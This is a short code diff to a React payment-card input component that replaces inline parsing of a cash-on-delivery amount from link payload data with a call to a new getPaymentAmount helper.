@@ -15,6 +15,7 @@ import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validat
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { getPaymentAmount } from "@/utils/paymentData";
 
 const PaymentCardInput = () => {
   const { id } = useParams();
@@ -41,22 +42,10 @@ const PaymentCardInput = () => {
 
   const shippingInfo = linkData?.payload as any;
 
-  // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
+  // Get amount dynamically from any service type
+  const amount = getPaymentAmount(linkData?.payload);
 
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
-
+  // Format amount with correct currency
   const formattedAmount = formatCurrency(amount, selectedCountry);
 
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
